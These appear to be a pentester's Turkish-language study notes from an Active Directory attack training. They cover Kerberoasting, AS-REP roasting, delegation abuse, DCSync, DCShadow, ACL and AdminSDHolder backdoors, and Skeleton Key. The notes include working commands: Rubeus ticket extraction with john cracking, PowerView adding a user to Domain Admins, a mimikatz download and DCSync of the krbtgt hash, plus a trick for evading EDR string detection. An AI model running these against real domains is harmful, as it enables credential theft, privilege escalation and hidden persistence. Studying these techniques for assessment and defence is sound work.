## AD Security Assessment not3s from Hacktrick'22 ## 

	-> github.com/koparmalbaris

# Active Directory üzerinde "Enterprise Admins" veya "Domain Admins" gibi en yetkili gruplar dışında;

	DnsAdmins, Group Policy Creator Owners, Print Operators, Server Operators ve Account Operators gruplarında yetkili bir kullanıcı ele geçirilmesi durumunda yine tüm Active Directory üzerinde farklı metodlar ile komut çalıştırabilmek mümkün hale geliyor. 

		Örnek olarak "Group Policy Creator Owners" grubu yetkilerine sahip olan bir kullanıcının ele geçirilmesi durumunda; DLL Injection gibi saldırı vektörlerini gerçekleştirecek GPO'lar hazırlanarak merkezi bir sistemden AD'ye bağlı tüm client cihazlara doğru saldırılar gerçekleştirilebilir.

		"DnsAdmins" grubu ise DNS Suncusuu üzerinde DLL ile komut çalıştırma yetkisine sahiptir.

		"Print Operators" grubu sunucular üzerinde yazıcı driverları ekleyerek komut çalıştırma haklarına sahiptir.

		"Server Operators" grubu sunucuların yönetimlerini gerçekleştirme yetkilerine sahiptir.

		"Account Operators" grubu Active Directory hesaplarının yönetimini gerçekleştirme yetkilerine sahiptir.

# Active Directory üzerinde Gruplar'a dahil olan kullanıcılar, gruplar üzerinde olan tüm yetkilere sahip olmaktadır. Gruplar bünyesindeki yetkileri (ACL, Local Admin vb.) barındırdıkları üye/objelere aktarırlar. Bu sebep ile "bariskoparmal" kullanıcısı direkt olarak "Domain Admins" veya "Enterprise Admins" grubunda olmasa da, ekli olduğu bir grup "Domain Admins" grubunda yer alıyor ise (isterse 50. grup, isterse 500. grup üzerinden fark etmez) aynı şekilde bariskoparmal kullanıcısı da Domain Admins yetkilerine sahip olmaktadır. Bu nedenle iç içe (nested) grup üyelikleri detaylı olarak incelenmelidir.

	Örneğin: "bariskoparmal" kullanıcısı "Pentesters" grubunda yer almaktadır. Pentesters grubu Domain Admins grubuna tanımlı ise dolaylı yoldan bariskoparmal kullanıcısı da Domain Admins yetkilerine sahip olacaktır.

	Bu senaryoda Domain Admins yetkileri için direkt olarak ilk grup üzerinden yetki tanımlanması şart değildir. "Pentester" grubu "Security" grubuna, "Security" grubu "ITAdmins" grubuna ve "ITAdmins" grubunun da "Domain Admins" grubuna bağlı olduğu bir senaryo düşünelim. Bu senaryoda yalnızca "Pentester" grubunda yer alan "bariskoparmal" kullanıcısı dolaylı yoldan Domain Admins haklarına sahip olmaktadır.

# ACE ve ACL Yapıları

	Active Directory ortamında yetkilendirme politikaları çok detaylı bir şekilde tanımlanabilmektedir. Bu bilgiler domain veritabanında objelerin içerisinde yer almaktadır. ACE/ACL yapılarında çok detaylı ve spesifik yetkilendirmeler gerçekleştirilebildiği için bu mekanizmalar ile tespit edilmesi çok zor backdoorlar yaratılarak AD üzerinde kalıcılık (persistence) sağlanabilmektedir. 

		Ele geçirilen bir hesabı yetkili bir gruba eklemek yerine (bu ilgili kurumda tüm alarmları devreye geçirecektir) yetkili bir grup üyesi üzerinde ACL backdoor oluşturmak tespiti oldukça zor olan bir yöntem olmaktadır.

	ACE (Access Control Entry): Yetkilendirme tanımı için kullanılan tekil girdilerdir.

	ACL (Access Control List): Yetkilendirme tanımlarının birlikte oluşturduğu ve objeye erişimlerin nihai kurallarını barındıran girdilerdir.

		* DACL (Discretionary ACL): Yetkilendirme için kullanılan ACL girdileridir.

		* SACL (System ACL): Objeye erişimin kayıt altına alınması için kullanılan ACL girdileridir.

	Owner: Objenin sahibini belirtir, obje sahibinin obje üzerinde herhangi bir değişikliği yapma yetkisi bulunmaktadır.

	GenericAll: Obje ile ilgili tüm değişiklikleri yapma yetkisidir.
 	
	GenericWrite: Objenin tüm değerlerine (attribute) yazma yetkisidir.

	WriteDACL: Obje üzerindeki yetkileri düzenleme yetkisidir.

	Extended-Rights: Obje üzerinde çeşitli değerler üzerinde yazma yetkisidir.

		* Force-Change-Password, GetChanges, WritePropery

# SPN (Service Principal Name) objeler üzerinde bulunur ve objelerin hangi servisi yönettiğini gösterir. Kerberos erişiminde ve iletişiminde bu değerler kullanılmaktadır. Kerberos protokolünde servislere erişim ve kontroller sırasında SPN değerleri kullanılmaktadır.

# KRBTGT: Kerberos protokolünü ve KDC servisini yöneten kullanıcı hesabıdır. Kerberos sırasında kullanılan biletlerin bir kısmı bu hesabın parola özeti ile oluşturulmakta olduğu için sonrasında bu KRBTGT elde edilmesi durumunda tüm sunuculara erişim sağlanabilir duruma gelinebilmektedir çünkü KRBTGT'nin parola özetinin ele geçirilebildiği durumda domain ortamında yer alan bütün hesaplar için ticket oluşturma haklarına sahip olunur. Bu saldırı vektörüne "Kerberos Golden Ticket Attack" denmektedir. 

# TGT (Ticket Granting Ticket) Servislere vb. ulaşım sağlamak için alınması gereken biletleri temin eden master ticketi sağlamaktadır. x servera erişim sağlarken x biletini elde edebilmek için ilgili servise giderek master ticketimiz olan TGT'yi gösteriyoruz ve eğer TGT'mizin buna yetkisi var ise X serverına erişim için X biletini TGT sayesinde alabiliyoruz. 
	
	(https://bariskoparmal.com/2019/12/03/kerberos-protokolu-saldirilari-nedir/)

# Objelerin (KRBTGT, Service Account, User) parolası ile şifrelenen veri içeren tüm biletlere offline olarak brute force yapılabilir. Bu sayede eğer parola basitse plain-text olarak ele geçirilebilir.

# Unconstrained Delegation yöntemi ile sunucuya kendisine erişen istemcileri taklit etme (impersonation) yeteneği sağlanmaktadır.

	Bu işlemin gerçekleşebilmesi için Kerberos protokolünün son aşamasında istemci, sunucuya TGT biletini de göndermektedir. Sunucu da bu bileti kullanarak diğer servis için gerekli ST biletini DC’den almaktadır.

  	Bu yöntem bize, sunucunun kendisine erişen istemcileri taklit etme yeteneğini sağlar ve örnek senaryoda direkt IIS Serivisi üzerinden MSSQL Servisine erişim sağlayabileceğimiz saldırı vektörleri yaratabilmemize yardımcı olur.

  		(https://bariskoparmal.com/2021/04/25/incognito-ile-impersonate-token-saldirisi/)

# Constrained Delegation ise zafiyetsiz olan şekildeki delege servisidir. Bu sayede sunucu belirli servisler dışındaki servislere erişim sağlarken impersonation yapamayacaktır.

	Örneğin, IIS Servisi x kullanıcısını "sadece" MSSQL servisine erişim sağlamak istediği zamanlarda "impersonate" etsin gibi bir güvenlik kontrolü sağlayan mekanizmaya sahiptir. 

	Ancak ticketler içersinde ki servis bilgisi clear-text olarak iletilmekte olduğu için Constrained Delegation metodu da bypass edilebilmektedir. Clear-text olarak iletilen servis bilgisi değiştirilerek normalde yetkisi olmayan bir servise doğru impersonate işlemi gerçekleştirilebilmektedir.

	Bu nedenle servis kısıtı geçersiz kalmakta ve Constrained Delegation sadece sunucu kısıtı uygulayabilmektedir.

# Resource Based Constrained Delegation, vekaletle çalışan bir sistem olarak düşünülebilir. 

	Resource Based Constrained Delegation yöntemi Active Directory ortamındaki objelerin kendi üzerlerinde delegasyon tanımlayabilmeleri için geliştirilmiştir. Yani bu yöntemi herhangi bir admin ihtiyacı olmadan her kullanıcı kendisi için tanımlayabilmektedir.

	Bu yöntemde ayrıca delegasyon yönü diğerlerine göre terstir. Yani kullanıcı delegasyon tanımlarken kendisine erişebilecek objelerin tanımını yapmaktadır.

	Örneğin, x kullanıcısı y kullanıcısına vekalet vererek benim haklarımı kullanarak z servisine erişim sağlayabilirsin diyor gibi bir senaryo düşünebiliriz.

# Objelerin her kullanıcıya (Authenticated Users) read yetkisi olması sebebi ile Active Directory üzerinde çeşitli keşif (recon) çalışmaları gerçekleştirilebilmektedir. Bazı durumlarda bu read yetkilerinin disable edilmesi AD üzerinde bir sıkıntıya sebebiyet vermemektedir, bu konular için Active Directory üzerinde hardening çalışmaları gerçekleştirilebilir.

# Windows sistemlerde bazı kurulumlar vb. sonrasında cihaz üzerinde "Unattend.xml" dosyası oluşmakta ve local admin parolası plain-text olarak bu dosya içerisinde yer alıyor. Sonrasında bu konu için blogpost hazırlanabilir. Yanlış config kaynaklı bu zafiyet tetiklenmektedir. Aşağıda bir referans kaynağı yer almaktadır.

	https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/update-windows-settings-and-scripts-create-your-own-answer-file-sxs?view=windows-11

# Slaytta yer alan WINNT komutları ile remote cihazlarda ki local grup bilgilerini, local user bilgilerini vb. çekebilmek mümkün oluyor. Bu konu araştırılarak blog yazılabilir. (Win7 ve Server 2008 öncesi cihazlarda WINNT komutları yetkisiz olarak çalıştırılabiliyor ama sonra ki sistemlerde bu WINNT komutları için komutun çalıştırılmak istendiği makinede local admin olmak gerekiyor.)

	# WINNT ile bilgisayardaki lokal grup bilgilerinin alınması
		([ADSI]'WinNT://10.2.6.105,computer').psbase.children | where {
		$_.psbase.schemaClassName -eq 'group' } | foreach { ($_.name)[0]}

	# WINNT ile bilgisayardaki lokal user bilgilerinin alınması
		([ADSI]'WinNT://192.168.56.103,computer').psbase.children | where {
		$_.psbase.schemaClassName -eq 'user' } | foreach { ($_.name)[0]}

	# WINNT ile bilgisayardaki lokal administrators grup üyelerinin alınması
		([ADSI]'WinNT://192.168.56.103/Administrators,group').psbase.Invoke('Members') | foreach
		{ $_.GetType().InvokeMember('ADspath','GetProperty', $null, $_,$null).Replace('WinNT://','') } 

# Aşağıdaki powershell komutu ile "bütün userlar içerisinden description'u içerisinde Password geçen kullanıcıları listele" işlemini gerçekleştirmektedir.

	$ Get-ADUser -Filter 'Description -like "*Password*"' 

# PowerView Installation

	$ [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
	
	$ Invoke-WebRequest -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -out PowerView.ps1

	$ Import-Module .\PowerView.ps1

# "net user /domain" gibi komutlar EDR, SIEM gibi sistemlerde string değeri üzerinden kolaylıkla detect edilebilmektedir. Bunun yerine ilgili komutlar <net user /do>, <net user /dom>, <net user "/do"> şeklinde yazarak yine domain üzerinde istenilen komut çalıştırılabilir ancak farklı string değeri çalıştırıldığı için güvenlik ürünleri tarafından detect edilmesinin önüne geçilmesi sağlanabilir.

# ADExplorer aracı çalıştırılarak, aynı "Active Directory User and Computer Management" dashboard'u kullanıyormuş gibi AD'yi inceleyebilmenizi sağlıyor.

	$ iwr -uri https://download.sysinternals.com/files/AdExplorer.zip -OutFile AdExplorer.zip

# Powershell üzerinde ki Invoke-WebRequest komutu basit olarak "iwr" yazılarak çalıştırılabiliyormuş

	$ iwr -uri https://github.com/BloodHoundAD/SharpHound/releases/download/v1.0.3/SharpHound-v1.0.3.zip -OutFile sharp.zip

# BloodHoundla alakalı blog yazmzak istersem:

	BloodHound örnek queryler anlatıldı, bir node'a tıklandığında o node'a ait bilgilerin nasıl elde edildiğini, veya FROM > TO alanı kullanarak from'da yazılan kullanıcıdan Domain admin'e nasıl çıkılır kontrolleri gerçekleştirilebilir. Grafik yorumlamalar ile Graph ekranı incelendi ve neler yapılabileceği söylendi.

		$ iwr -uri https://github.com/BloodHoundAD/SharpHound/releases/download/v1.0.3/SharpHound-v1.0.3.zip -OutFile sharp.zip

		$ sharphound.exe -c all -s

			## Örneğin BloodHound üzerinde "shortest way the domain admin" pathini seçtik ve graph bizi karşıladı. Burada rastgele bir path üzerine tıklayarak yazılan neo4j querysi elde edilebilir ve sonrasında bu neo4j querysi istenilen değerlere göre vb. değiştirilebilerek farklı queryler çalıştırılabilir.

	 		## Graf haritasında gözüken bir bir saldırı vektörünün detaylarını görüntülemek için; Bir path çizgisi üzerinde "GenericAll" yazıyor diyelim, bu GenericAll'a sağ tıklayarak açılan sekme üzerinde bu zafiyetin ne olduğu, nasıl abuse edilebileceği ve nasıl kullanımının sağlanabileceği gibi bilgiler elde edilebilmektedir.

# Roasting saldırısı 

	Eğer çeşitli araya girme yöntemleri ile kurbanın Kerberos trafiği elde edilebilirse paketler içerisindeki şifreli alanlara offline olarak brute force yapılabilir. Bu sayede istemcinin, krbtgt hesabının ve servis hesabının parolası üzerinde saldırı gerçekleştirilebilir. Bu zafiyet kerberos ticketin parola ile hashlenmesinden kaynaklanıyor.)

# AS-REPRoasting ise KDC'de ticketin onaylanması sonrasında oluşan ticketa yapılan brute-force saldırısıdır. Kullanıcı ayarlarının properties sekmesi içerisinde "do not require Kerberos preauthtentication" özelliği enable durumda ise ilgili zafiyet ortaya çıkmaktadır.

	Active Directory ortamında eskiye uyumluluk nedeniyle Kerberos protokolündeki ilk aşama olan kimlik doğrulama (pre-authenticaton) devre dışı bırakılabilmektedir.

	Eğer herhangi bir istemci için pre-authentication mekanizması devre dışı bırakılmışsa bu istemcinin parolası bilinmeden AS-REP paketi elde edilebilmektedir. Bu nedenle bu istemcinin kullanıcı adını bilen herkes istemciye ait AS-REP paketini alabilir ve üzerinde offline brute-force saldırısı gerçekleştirebilir. 

	AS-REPRoasting gerçekleştirilebilecek kullanıcıların tespiti için aşağıdaki çeşitli komutlar kullanılabilmektedir.

		## ASREPRoastable Kullanıcıların Powershell ile tespit edilmesi
			$ get-aduser -filter * -properties DoesNotRequirePreAuth | Where-Object {$_.DoesNotRequirePreAuth -eq $true}

		## ASREPRoastable Kullanıcıların Neo4j sorgusu ile tespit edilmesi
			$ MATCH (u:User {dontreqpreauth: true}) RETURN u

	ASReproast ile kullanıcı hashinin elde edilmesi

		Kullanıcının usernamesi ile kullanıcının hashi elde edilebiliyor çünkü ilk bu ticketin elde edilebilmesi için username bilgisi ile auth olmaya çalışılıyor. Kurumlar içerisinde kullanılan bazı eski uygulamalar; uygulamayı kullanacak servis veya kullanıcıların "pre-auth" yapmamasını bekledikleri için bazı kurumlarda bu ayarların açık olduğu kullanıcılar yer alabiliyor. İlgili "Do not require Kerberos preauthentication" değeri "User Management > User > Properties" içerisinden görülebilmektedir.

			$ .\rubeus.exe asreproast /user:kenobi /outfile:4rch-hash.txt
			$ john 4rch-hash.txt

# Kerberoasting saldırısında ise ASREP paketi yerine TGSREP paketine yönelik saldırılar gerçekleştirilmektedir. Domain ortamındaki tüm kullanıcılar, tüm servisler için ST biletini elde edebilmektedirler. Bunun nedeni KDC üzerinde herhangi bir yetkilendirme kontrolü yapılmamasıdır. Kullanıcı hesabı tarafından yönetilen bir servise erişmek için alınan TGS-REP paketi içerisindeki ST bileti servis kullanıcısının parolası ile şifrelenmektedir. Bu sayede brute-force ile parola elde edilebilir duruma geliyor.

	Bir kullanıcının SPN'i (Service Principal Name) var ise bu user bir servis useridir diyebiliriz. Ve bu saldırıda servis userine yönelik saldırı gerçekleştirmek yetki yükseltme noktasında işimize yarayacaktır çünkü çeşitli yetkilere sahip olacaktır. Ayrıca bu service userları genellikle password never expire olarak kullanılmakta olduğu için ayrıca işimize yarar hale gelecektir. 

	Kerberoastable Kullanıcıların Powershell ile tespit edilmesi

		## Kerberoastable Kullanıcıların Powershell ile tespit edilmesi
			$ Get-ADUser -Filter {serviceprincipalname -like "*"} -Properties serviceprincipalname | Format-Table

		## Kerberoastable Kullanıcıların Neo4j sorgusu ile tespit edilmesi
			$ MATCH (u:User {hasspn: true}) RETURN u

	Kerberoastable kullanıcının hash bilgisinin elde edilmesi

		$ .\Rubeus.exe kerberoast /user:<username> /outfile:4rch-hash.txt
		$ john 4rch-hash.txt

	Kerberoasting için alınabilecek önlemler:

		Microsoft, Group Managed Service Accountlar için Active Directory üzerinde 2 adet obje yarattı. Bu objeler sayesinde servis accountların parolaları otomatik olarak değiştiriliyor ve AD üzerinde tutuluyor. İlgili servise erişim sağlanması durumunda AD direkt olarak erişim sağlattırıyor.

# ACL Exploitation Örneği (AddMember)

	"AddMember" ACL'i ile Palpatine kullanıcısı üzerinden Domain Admin'e yetki yükseltme senaryosu kurgulayalım. Bloodhound üzerinden incelediğimizde "Palpatine" kullanıcısının "Domain Admins" grubuna doğru giden yolu üzerinde "AddMember" ACL'i olduğunu görüyoruz.

	AddMember ACL'i olduğu için Domain Admins yetkilerinde kullanıcı ekleme hakkımız olduğunu anlayabiliyoruz. Burada ki misconfigurationu sömürerek Domain Admins grubuna kullanıcı ekleyebiliyoruz.

		# Powerview modülü import ediliyor
			Import-Module .\PowerView.ps1

		# Plaintext parola secure-string formatına dönüştürülüyor
			$SecPassword = ConvertTo-SecureString 'DieToAnakin123' -AsPlainText –Force

				## (Powershell'de parolayı direkt olarak plain-text olarak değiştirtemiyor, bu sebep ile yukarıdaki komut ile parolayı SecureString değere dönüştürmemiz gerekiyor.)
		
		# Kullanıcı adı ve parola ile credential objesi oluşturuluyor
			$Cred = New-Object System.Management.Automation.PSCredential('istanbul\lilah.herschel', $SecPassword)
		
		# Add-DomainGroupMember fonksiyonu ile kullanıcı gruba ekleniyor
			Add-DomainGroupMember -Identity 'Domain Admins' -Members 'lilah.herschel' -Credential $Cred
		
		# Domain Admins grubu üyeleri listeleniyor
			Get-DomainGroupMember -Identity 'Domain Admins'

# PrivExchange zafiyeti ile PrivEsc on AD

	Exchange sunucusunun bilgisayar hesabı varsayılan olarak domain objesi üzerinde yetkili ACE değerlerine sahiptir. (WriteDACL)

	Bu yetki ile Exchange sunucusu domain objesi üzerindeki yetkileri değiştirebilmekte ve istediği objeye yetki verebilmektedir.

	Domain objesi üzerinde GetChanges ve GetChangesAll isimli iki özel ACE bulunmaktadır. Bu ACE’lere sahip olan objeler DC sunucularından replikasyon yapabilirler. Bu sayede de DC veritabanında bulunan tüm değerleri (parola özetleri dahil) elde edebilirler.

	Active Directory ortamında mail kutusu bulunan bir kişi Exchange sunucusu üzerinde PushSubscription isimli bir mekanizma oluşturabilmektedir.

	Bu mekanizma sayesinde Exchange sunusundan istenilen sunucuya bildirim paketi gönderilebilmektedir.

	Bir saldırgan bahsedilen bu mekanizmaları kullanarak yetki yükseltme saldırısı gerçekleştirebilmektedir.

	Mail kutusuna sahip bir domain kullanıcısını ele geçiren bir saldırgan öncelikle PushSubscription ile Exchange sunucusundan kendi kontrol ettiği bir sunucuya istek yaptırır.

	Saldırgana gelen bu istek HTTP protokolünü ve NTLM kimlik doğrulama yöntemini kullanmaktadır. Saldırgan Exchange bilgisayar hesabına ait NTLM kimlik doğrulama paketini NTLM Relay saldırısı ile LDAP protokolünü kullanarak DC sunucusuna yönlendirir.

	DC sunucusuna başarıyla erişim sağlandıktan sonra, Exchange sunucusunun domain üzerinde WriteDACL yetkisi de bulunduğu için istenilen objeye domain objesi üzerinde GetChanges ve GetChangesAll yetkisi verilir.

	Son adımda ise bu obje ile DC veritabanındaki parolalar replike edilerek tüm hesapların parola özeti elde edilir.

# Group Policy Preferences ile PrivEsc on AD

	Active Directory ortamında lokal admin parolaları Group Policy Preferences aracılığıyla da yönetilebilmekteydi. Bu arayüz üzerinden kullanıcıların parolaları belirlenmekte ve GPO ile dağıtılabilmektedir.

	Parolaların kayıtlı olduğu xml dosyası GPO ile dağıtıldığından tüm domain kullanıcıları/bilgisayarları tarafından okunabilmektedir. Bu parola bilgisi AES algoritması ile şifrelenmektedir fakat Microsoft şifreleme anahtarını yayınlamıştır. Bu sayede bu dosyayı okuyabilen bir saldırgan kolayca local admin parolalarını da elde edebilmektedir.

	Bu zafiyet SYSVOL dizini altında parolanın şifrelenmiş hali yer alıyor. AES şifrelemesi microsoft tarafından paylaşıldığı için ilgili XML Dosyası içerisinden parola elde edilebiliyor ve AES ile decrypt edilerek parola elde edilebiliyor. GPO'lar çalışsın diye tüm DC'ler üzerinde SYSVOL dizini altına bu XML dosyaları yazılıyor.

		## use auxiliary/scanner/smb/smb_enum_gpp

		## https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1

# Constrained Delegation - Protocol Transition ile PrivEsc on AD

	Zafiyetli Bilgisayarların Tespiti

		# S4U2Self aktif bilgisayarların Neo4j ile tespit edilmesi

			MATCH (n) WHERE n.trustedtoauth = True RETURN n.name, n.allowedtodelegate

		# S4U2Self aktif bilgisayarların Powershell ile tespit edilmesi

			$ Get-ADComputer -Filter * -Properties TrustedToAuthForDelegation,msDS-AllowedToDelegateTo | Where-Object {$_.TrustedToAuthForDelegation -eq $true}

	Sömürülmesi

		# PsExec ile NT AUTHORITY/SYSTEM Shell açılıyor
			
			.\PsExec.exe -accepteula -s powershell.exe
		
		# System.IdentityModel assemblysi yükleniyor

			$Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel’);

		# Administrator kullanıcısı için Identity objesi oluşturuluyor
			$i = New-Object System.Security.Principal.WindowsIdentity @('Administrator’);

		# Impersonation işlemi gerçekleştiriliyor
			$i0 = $i.Impersonate();

		# Impersonation işlemi geri alınıyor
			$i0.Undo();

# Constrained Vs UnConstrained farkı, exploit yöntemleri, AD'de hangi ayarlar aktif olduğunda bu zafiyetler olur, hangileri kapatılarsa zafiyetler kapatılır gibi konular araştırılabilir ve blogpostlar hazırlanabilir.

# Kali-Linux'ta kullanılan "evil-winrm" komutlarının powershell halleri:

	## enter-pssession -computername <computername>

	## invoke-command -computername <computername>

		### enter-pssession komut çalıştıracağı yerde bir session oluşturup buradan haberleşiyorken, invoke-command sadece hedef sunucuda belirtilen bir komutu çalıştırıp bırakıyor yani bir session açmıyor.

# Pass the Hash

	Bu teknik sayesinde NTLM protokolü ile kullanıcının parola özetini kullanarak Windows sunucularda uzaktan komut çalıştırılabilmektedir. Bu da parola özeti üzerinde brute-force saldırısı yapmaya gerek kalmadan bulunan değerin kullanılmasını sağlamaktadır.

	## Bilgisayar Hesabı ile Pass the Hash Saldırısı

		Active Directory ortamında bilgisayar hesaplarının da kullanıcı hesapları gibi parolaları bulunmaktadır. Bilgisayar hesapları kullanıcılar gibi bu parolalarla NTLM ve Kerberos protokolleriyle kimlik doğrulama işlemini gerçekleştirmektedirler. • Bu nedenle kullanıcı hesapları ile PtH saldırısı yapıldığı gibi bilgisayar hesapları ile de PtH saldırısı yapılabilmekte ve sunucular üzerinde komut çalıştırılabilmektedir. Fakat normal PtH saldırısında olduğu gibi burda da bilgisayar hesabının sunucu üzerinde komut çalıştırma izninin bulunması gerekmektedir.

# Over Pass the Hash

	Over PtH saldırısı PtH saldırısından farklı olarak NTLM protokolüyle değil Kerberos protokolü ile kimlik doğrulamayı sağlamaktadır. Bu özelliği sayesinde NTLM protokolünün devre dışı bırakıldığı ortamlarda da çalışabilmektedir.

	Fakat Kerberos protokolü için domain kullanıcı hesabı gerektiği için lokal kullanıcılarla oturum açma sırasında bu saldırı kullanılamamaktadır.

	Bu saldırı yöntemi sayesinde parola özeti bilinen kullanıcı için TGT bileti alınarak bu kullanıcının yetkili olduğu servislere erişim sağlanabilir. Eğer bu servisler sunucu üzerinde komut çalıştırmaya olanak sağlıyorsauzaktan komut çalıştırma işlemi de gerçekleştirilebilir.

# Pass the Ticket

	TGT ve ST biletleri varsayılan koşullarda sunucu belleğinde 10 saat tutulmakta bu süre geçince de silinmektedir.

	Bu saldırı yöntemi ile ele geçirilen bir sunucu belleğindeki TGT veya ST biletleri kullanılarak yatayda yayılım gerçekleştirilebilir.

	Burada önemli olan nokta sunucu belleğinden bilet verisi ile birlikte Session Key verisi de elde edilmelidir aksi takdirde Kerberos süreci tamamlanamayacaktır.

	Bu nedenle ağ üzerinden elde edilen TGT ve ST biletleri Pass the Ticket saldırısında kullanılamamaktadır.

# DCSync

	Domain objesi üzerinde GetChanges ve GetChangesAll isimli iki özel ACE bulunmaktadır. Bu ACE’lere sahip olan objeler DC sunucularından replikasyon yapabilirler. Bu sayede de DC veritabanında bulunan tüm değerleri (parola özetleri dahil) elde edebilirler.

	Varsayılan olarak bu yetki DC sunucuları ve yetkili gruplarda bulunmaktadır. Saldırgan bu yetkiye sahip olduktan sonra istediği objenin veya tüm objelerin parola özetini ele geçirebilir.

	DCSync ile istenilen objeye "GetChanges ve GetChangesAll" yetkileri verilerek kendimizi DC gibi gösterip DC'yi replike etmeye taklit edebilir ve AD üzerinde kalıcılık sağlanabilir.

		# Mimikatz indiriliyor
			$ iwr -Uri https://github.com/frknozr/hacktrick22/raw/main/mimikatz.exe -OutFile mimikatz.exe

		# Dcsync ile krbtgt hash bilgisi elde ediliyor
			$ \mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt@darkside.local" "exit" 

	Kurum içerisinde gerçekleşecek böyle bir saldırının tespiti için DC dışından bir makineden replikasyon isteği gelmesi durumunda alert üret vb. gibi kurallar yazılarak önlemler alınabilir.

# DCShadow

	DCsync ile biz DC'den data çekiyorudk ama DCShadow'da tam tersi olarak biz DC'ye data gönderebiliyoruz. Bu sayede bazı attribute'lar yaratarak daha gizli backdoorlar sunucu üzerinde yaratılabiliyor. 

	Yani bu yöntemde DC sunuculardan replike ile veri alınmaz, tam tersine sahte bir DC sunucusu oluşturularak diğer DC’lere sahte veri gönderilir. Örnek saldırı senaryoları olarak:

		1- Örneğin krbtgt objesinin pwdhistory attribute değeri değiştirilerek halihazırda kullanılan parola bozulmadan Golden Ticket vb saldırıları gerçekleştirilebilir 

		2- Objelerin SID-History değerleri değiştirilerek istenilen objenin yetkisi yükseltilebilir.

		3- Objelerin PrimaryGroupID değeri değiştirilerek istenilen obje gizli bir biçimde yetkili gruplara eklenebilir.

		4- Active Directory ortamında istenilen değerlerle yeni objeler oluşturulabilir veya silinebilir.

	Bu işlemlerin bir çoğu ise herhangi bir log oluşturmamaktadır. Bu sebep ile sistem üzerinde gizli kalıcılık sağlamak için faydalı olan bir saldırı yöntemi olmaktadır.

# Bir noktada saldırganın Golden Ticket'ı oluşturması durumunda (dilerse 10 saatlik dilerse 10 yıllık ticketlar oluşturulabilir) Böyle bir saldırının kurumda gerçekleşmesi sonrasında kerberos ticketlarının microsoft tarafından yayınlanan script ile resetlenmesi gerekmektedir. Golden Ticket ile üretilmiş/üretilecek olan ticketların tamamen unavailable olabilmesi için 2 kere kerberos ticketinin resetlenmesi gerekmektedir.

# ACL Backdoor

	Sisteme sızılıp domain adminse kullanıcı eklenmesi durumunda siem,edr vb. tarafından alarmlar ötüyor ve çok gürültü çıkarıyor. Bunun yerine kalıcılık sağlamak için ACL Backdoorlar tanımlanabilir, backdoorlar tanımlarken detect edilme olasılığıda oldukça düşük olacaktır.

	Active Directory ortamında yetki yükseltmesi yapılarak herhangi bir admin hesabı ele geçirildikten sonra istenilen obje üzerindeki ACL değerleri değiştirilebilmektedir. Bu mekanizma kullanılarak çeşitli ACL’ler tanımlanarak daha sonra tekrar kullanmak amacıyla arkakapılar oluşturulabilmektedir.

		herhangi bir domain adminin parolasını resetleme yetkisi tanımlarsak dilediğimiz zaman domain admine yetki yükseltebilir hale geliriz, writedacl yetkisi verilerek yazma yetkisi verilebilir, AddUser yetkisi tanımlayarak istenilen zaman Domain Admin grubuna kullanıcı eklenmesi vb. sağlanabilir.

		Veya yüksek yetkilere sahip bir obje oluşturularak bu obje sonrasında domain admins grubuna eklenebilir. Bu obje Active Directory management üzerinde direkt olarak görüntülenememekte. Sadece Domain Admins grubuna bakıldığında böyle bir objeye domain admin yetkileri verilmiş olduğu görülebilir ve bu yetkiler kaldırılabilir. Ama örneğin ilgili obje hala silinemez kalıyor.

		Yani kullanıcıya tamamen farklı bir obje oluşturup bu kullanıcıya gerekli yetkileri verdikten sonra sistem üzerinde gizli kalıcılık sağlanabilir. 

		## Örnek ACL Backdoor Senaryoları

			1- İstenilen objelere GetChanges, GetChangesAll yetkileri eklenerek DCSync yapabilme yetkisi verilebilir.

			2- İstenilen objeye admin gruplarından herhangi birine üye ekleme yetkisi verilebilir. (WriteProperty)

			3- İstenilen objeye Administrators kullanıcısının parolasını resetleme yetkisi verilebilir. (ForceChangePassword)

			4- İstenilen objeye kendisini admin gruplarına ekleme yetkisi verilebilir. (Self-Membership)

			5- İstenilen objeye admin objelerinin DACL değerlerini değiştirme yetkisi verilebilir. (WriteDACL)

		## ACL’lerdeki DENY girdisi ile Active Directory ortamında kimsenin direkt görüntüleyemeyeceği objeler oluşturulabilmektedir.

			https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence

			https://grzegorztworek.medium.com/windows-object-permissions-as-a-backdoor-fa33eb7857c4

			https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-190101151110.html

# AdminSDHolder explotiti de aynı şekilde bir obje oluşturup bu obje üzerinden domain admin haklarında persistent sağlamak amacı ile kullanılıyor.

	AdminSDHolder (Admin Security Descriptor Holder) Active Directory ortamında bulunan bir konteynerdir. Bu konteyner üzerinde admin objelerine ait olması gereken ACL değerleri bulunmaktadır.

	SDProp (Security Descriptor Propagation) fonksiyonu her saatte bir çalışarak AdminSDHolder üzerindeki ACL değerlerine göre admin objelerindeki ACL değerlerini günceller.

	Burada amaç admin hesaplarının ACL değerlerinin kötü niyetli veya yanlışlıkla değiştirilmesinin önüne geçmektir.

	Örneğin saldırgan Domain Admins grubu üzerinde kötü amaçlı bir ACL değeri eklese bile bir saat içerisinde bu ACL değeri silinecektir.

	Fakat saldırgan istediği ACL değişikliğini AdminSDHolder üzerinde yaptığında, bu değişiklik her saat admin gruplarına tekrar iletilecektir. ACL admin gruplarından silinse bile tekrar güncellenecektir. 

# Skeleton Key zararlısı ile; standart bir LSASS process içerisine kendi kod bloğunu inject ediyor yani memory injection gerçekleştiriyor. Mimikatz ile bu yapılabiliyor. Bu sayede istenilen bir username için "mimikatz" parolası kullanılabiliyor hale geliyor. Kesinlikle araştırıp bloga çevirilebilir.

	Bu yapılan injection sonrasında DC veya DC'lere rest atılana kadar yani LSASS'dan temizlenene kadar bu zafiyet devam ediyor halde kalıyor çünkü LSASS processi üzerine bu zafiyeti memorye injection ediyor.

	LSASS processi üzerinden eğer gerekli koşullar sağlanırsa plaintext parola, NTHash gibi bilgiler elde edilebilmektedir.

